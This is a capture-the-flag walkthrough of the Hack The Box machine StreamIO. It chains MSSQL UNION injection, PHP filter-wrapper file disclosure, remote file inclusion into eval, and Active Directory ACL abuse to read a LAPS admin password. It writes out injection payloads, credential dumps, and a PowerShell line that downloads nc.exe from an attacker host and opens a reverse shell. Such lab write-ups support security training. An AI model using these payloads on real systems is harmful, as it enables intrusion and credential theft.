## About StreamIO

**Name:** StreamIO

**Machine:** https://app.hackthebox.com/machines/StreamIO

**Difficulty:** Medium

**OS:** Windows

**Target IP:** 10.129.60.150

---
## Recon

We kicked things off with a standard Nmap scan:

```
nmap -sC -sV -oA StreamIO -v 10.129.60.150
```

The combination of Kerberos (88), LDAP (389/3268), and SMB (445) confirmed this was a Domain Controller, and the addition of open ports 80 and 443 told us there was a web application layer sitting on top of it.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-11 16:36:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
|_ssl-date: 2026-08-11T16:38:34+00:00; +6h59m59s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:     b99a 2c8d a0b8 b10a eefa be20 4abd ecaf
| SHA-1:   6c6a 3f5c 7536 61d5 2da6 0e66 75c0 56ce 56e4 656d
|_SHA-256: 1efc 48cc 0bd9 757f c585 d1fb 7e52 5009 ed0a a3e9 9acc 1a97 0b26 8418 6801 bf09
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We added the domain (`streamIO.htb`) and hostname (`DC`) to our `/etc/hosts` file.

![](Assets/2026-08-11_15-14.png)

We quickly checked SMB for null and guest session access, but both were disabled - meaning any further SMB enumeration would require valid credentials first.

![](Assets/2026-08-11_15-16.png)

## Web Enumeration

Port 80 served a default IIS landing page, and directory brute-forcing against it turned up nothing of value.

![](Assets/2026-08-11_15-22.png)

Port 443, on the other hand, hosted a functional online movie streaming site at `https://streamio.htb/`.

![](Assets/2026-08-11_16-12.png)

We found a login page and tried brute-forcing it with a username/password combination list, but this didn't give us any result.

![](Assets/2026-08-11_16-18.png)

Directory brute-forcing against the main site gave us some result, but we were denied access to all of them at this stage.

![](Assets/2026-08-11_19-41.png)

With the main site fully enumerated and nothing else obviously exploitable, we turned to virtual host fuzzing:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://streamIO.htb:443/ -H 'Host: FUZZ.streamIO.htb'
```

This confirmed `watch.streamIO.htb` as a live virtual host (this was also shown on our nmap result but I missed it). We added it to `/etc/hosts` and browsed to it:

![](Assets/2026-08-11_16-56.png)

Directory fuzzing against this new vhost showed up a `search.php` endpoint:

```
ffuf -u https://watch.streamio.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt.asp
```

![](Assets/2026-08-11_17-18.png)

![](Assets/2026-08-11_17-21.png)

Clicking "watch" on any movie triggered a prompt.

![](Assets/2026-08-11_17-22.png)

## Foothold

As a quick check, I tried a simple SQL injection payload in the search box. This got us redirected to a `/blocked.php` page displaying "Malicious Activity Detected!!" which, was actually a good sign. 

![](Assets/2026-08-11_17-26.png)

Going back to `search.php`, we were able to search normally again without being blocked out. I tried a UNION-based injection, incrementing the column count to find out number of columns:

```
cn' UNION select 1
```

After a few attempts, this injection works for me:

```
cn' UNION select 1,2,3,4,5,6-- -
```

This returns 2 & 3, meaning the original query has 6 columns and only the 2nd and 3rd columns are displayed.

![](Assets/2026-08-11_17-41.png)

To confirm we could pull real data, we swapped the second column for `@@version` (a query that returns the SQL Server version string):

```
cn' UNION select 1,@@version,3,4,5,6-- -
```

![](Assets/2026-08-11_17-45.png)

With confirmed UNION-based injection, we will enumerate the database until we find any column interesting. We started with listing databases:

```
cn' UNION select 1,name,3,4,5,6 from master..sysdatabases;-- -
```

![](Assets/2026-08-11_18-01.png)

`master`, `model`, `msdb`, and `tempdb` are all default MSSQL system databases and not of interest. We got two non-default databases `STREAMIO` and `streamio_backup`.

We confirmed the application's own database context using `DB_NAME()`, which returned `STREAMIO`:

```
cn' UNION select 1,(select DB_NAME()),3,4,5,6-- -
```

![](Assets/2026-08-11_18-10.png)

We listed the tables inside these two databases:

```
cn' UNION select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U'-- -
cn' UNION select 1,name,id,4,5,6 from streamio_backup..sysobjects WHERE xtype = 'U';-- -
```

`STREAMIO` resulted in two tables while `stream_backup` gives us an empty result. Maybe we don't have enough privileges to access `stream_backup`.

![](Assets/2026-08-11_18-23.png)

We then listed the column names of the `users` table:

```
cn' UNION select 1,c.name,2,4,5,6 from streamio..syscolumns c inner join streamio..sysobjects o on c.id=o.id where o.name='users'-- -
```

![](Assets/2026-08-11_18-28.png)

Finally, we dumped the actual `username:password` pairs from the table:

```
cn' UNION select 1,concat(username,':',password),3,4,5,6 from users;-- -
```

![](Assets/https___watch.streamio.htb_search.php(1).png)

We saved this output to a file (`creds.txt`) and used `awk` to split it into separate hash and username lists for cracking:

```
awk -F':' '{gsub(/ /,"",$2); print $2}' creds.txt > hashes.txt
awk -F' :' '{print $1}' creds.txt > usernames.txt
```

Then, we cracked these md5 hashes using john.

![](Assets/2026-08-11_18-54.png)

Next, we used `kerbrute` to check which of those usernames were valid domain accounts (a web-app user list and an AD user list aren't necessarily the same thing).

```
kerbrute userenum -d streamIO.htb --dc 10.129.60.150 usernames.txt -o valid_ad_users
```

Only one hit came back `yoshihide`.

![](Assets/2026-08-11_19-07.png)

We tried brute-forcing `yoshihide`from passwords we cracked earlier, but nothing landed:

![](Assets/2026-08-11_19-09.png)

Going back to the web login page from earlier, we retried the brute-force there. This time targeting `yoshihide` specifically with a password list.

![](Assets/2026-08-12_02-14.png)

This paid off - `yoshihide:66boysandgirls..` was valid. Logging in revealed a "LOGOUT" link at the top of the page, confirming we now had an authenticated session.

![](Assets/2026-08-11_19-32.png)

We navigated to `/admin`, which we'd already spotted during our earlier directory brute-forcing:

![](Assets/2026-08-11_19-50.png)

Clicking "User Management" took us to `https://streamio.htb/admin/?user=`, an interesting parameter worth testing further:

![](Assets/2026-08-11_19-52.png)

We tried some basic LFI payloads against the `user` parameter without success, so we fuzzed for other GET parameters the admin panel might respond to:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://streamio.htb/admin/?FUZZ= -b "PHPSESSID=h2ht7h9n1ov713bpqa28a5o6
vf" -fs 1678 
```

This turned up several parameters:

![](Assets/2026-08-11_20-13.png)

Trying to access `index.php` through `debug` parameter returned us a base64 code:

```
https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=index.php
```

![](Assets/2026-08-11_20-15.png)

Decoding the returned base64 revealed hardcoded database credentials inside `index.php`. We didn't have an immediate use for them yet, but noted them down for later.

![](Assets/2026-08-11_20-17.png)

Next, we fuzzed for additional PHP files reachable through the same `debug` parameter, and turned up `master.php`.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://streamio.htb/admin/?debug=FUZZ.php -b "PHPSESSID=h2ht7h9n1ov713bpqa28a5o6vf" -fs 1712
```

![](Assets/2026-08-11_20-38.png)

Reading it the same way via the filter wrapper:

```
https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=master.php
```

Decoding the base64 output, we find that the script takes a POST parameter called `include`, reads whatever file path (or URL) is supplied, and passes the raw content directly into `eval()` and gets executed on the server. This is a RFI vulnerability, we can exploit it to get reverse shell.

```
<?php                                           
} # while end                                                                     
?>                                                                                
<br><hr><br>                 
<form method="POST">                                                              
<input name="include" hidden>                   
</form>                                                                           
<?php
if(isset($_POST['include']))                                                      
{                                                                                 
if($_POST['include'] !== "index.php" )                                            
eval(file_get_contents($_POST['include']));               
else                                                                              
echo(" ---- ERROR ---- ");                                                        
}                                                            
?>base64: invalid input   
```


We will use Netcat, which will be transferred to the target and then executed to connect to our listener. Let's create a file containing our reverse shell code:

```
system('powershell -c "wget http://<ATTACKER_IP>:8000/nc.exe -outfile C:\\Windows\\Temp\\nc.exe"'); system('C:\\Windows\\Temp\\nc.exe -e powershell <ATTACKER_IP> 443');
```

We captured a request to the `master.php` debug endpoint in Burp, sent it to Repeater, changed the method to `POST`, modified and set the `include` body parameter to our payload:

![](Assets/2026-08-11_22-31.png)

With a Netcat listener running, we sent the request and caught a shell:

![](Assets/2026-08-11_22-30.png)

Manual enumeration on the box didn't get us anything, but we still had those database credentials recovered from `index.php` earlier. We used them with `sqlcmd` to enumerate the MSSQL instance from the inside:

```
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM master.dbo.sysdatabases'
```

![](Assets/2026-08-11_22-59.png)

We can access `streamio_backup` this time and we listed its tables:

```
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q 'USE streamio_backup'
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q 'SELECT table_name FROM streamio_backup.INFORMATION_SCHEMA.TABLES'
```

![](Assets/2026-08-11_23-03.png)

A `users` table was present, so we dumped it:

```
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q 'USE streamio_backup; select * from users'
```

We got a list of usernames and their hashes.

```
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  
```

`nikk37` caught our attention specifically because, unlike the others, this account was an actual domain user.

![](Assets/2026-08-11_23-14.png)

The hash format looked like a fast, unsalted algorithm, so rather than running it locally we tried CrackStation's rainbow tables and it cracked successfully!

![](Assets/2026-08-11_23-18.png)

The credentials worked, and we got a shell as `nikk37` via `evil-winrm`, reading the user flag from there.

![](Assets/2026-08-11_23-22.png)

## Privilege Escalation

Enumerating SMB shares as `nikk37` only showed the default shares.

![](Assets/2026-08-11_23-25.png)

We collected BloodHound data to map out the domain from this new vantage point:

```
bloodhound-python -u nikk37 -p get_dem_girls2@yahoo.com -ns 10.129.60.150 -d streamio.htb -c all
zip -r streamio.zip *.json
```

Unfortunately, `nikk37` had no outbound object control and wasn't a member of any interesting groups.

![](Assets/2026-08-11_23-49.png)

Running winpeas on the target system reveals there are some stored credentials in firefox.

![](Assets/2026-08-12_00-18.png)

We can clone this tool [firepwd](https://github.com/lclevy/firepwd) and download the profile's `key4.db` and `logins.json` files from the target. With both files placed in the tool's directory, we ran:

```
python3 firepwd.py
```

This successfully decrypted four sets of stored credentials.

![](Assets/2026-08-12_01-03.png)

None of the recovered passwords matched their associated usernames directly, so we cross-referenced the usernames and passwords against each other instead. This produced one valid combination.

![](Assets/2026-08-12_01-13.png)

The credentials worked for SMB, but not for WinRM.

![](Assets/2026-08-12_01-16.png)

Checking user `JDgodd` in BloodHound showed it held `WriteOwner` rights over the "Core Staff" group. 

![](Assets/2026-08-12_01-19.png)

`WriteOwner` lets us change the owner of an object and since the owner of an AD object can grant themselves further permissions on it regardless of the object's existing ACL, this is effectively a stepping stone to full control.

We took ownership of the group:

```
bloodyad --host streamio.htb -d streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r set owner "Core Staff" "JDgodd"
```

As the new owner, we granted ourselves `GenericAll` over it:

```
bloodyad --host streamio.htb -d streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r add genericAll "Core Staff" "JDgodd"
```

With `GenericAll` in place, we added `JDgodd` directly into the "Core Staff" group and verified the change:

```
bloodyad --host streamio.htb -d streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r add groupMember "Core Staff" "JDgodd"
bloodyad --host streamio.htb -d streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r get object 'JDgodd' --attr memberOf
```

![](Assets/2026-08-12_01-34.png)

Next, we found that "Core Staff" itself held `ReadLAPSPassword` rights over the Domain Controller. `ReadLAPSPassword` enables us to read the local admin password (in Domain Controller, Domain Admins are also local admins).

![](Assets/2026-08-12_01-29.png)

Now, we can retrive the admin's password:

```
# Using BloodyAD
bloodyad --host streamio.htb -d streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r get object 'DC$' --attr ms-Mcs-AdmPwd

# Using Netexec
nxc ldap streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r -M laps
```

![](Assets/2026-08-12_01-35.png)

With the local administrator password in hand, we authenticated via `evil-winrm`. Interestingly, the root flag wasn't there in the Administrator's own directory as expected.

![](Assets/2026-08-12_01-44.png)

After a bit of additional searching across the filesystem, we found the root flag inside `Martin` user's directory.

![](Assets/2026-08-12_01-46.png)

---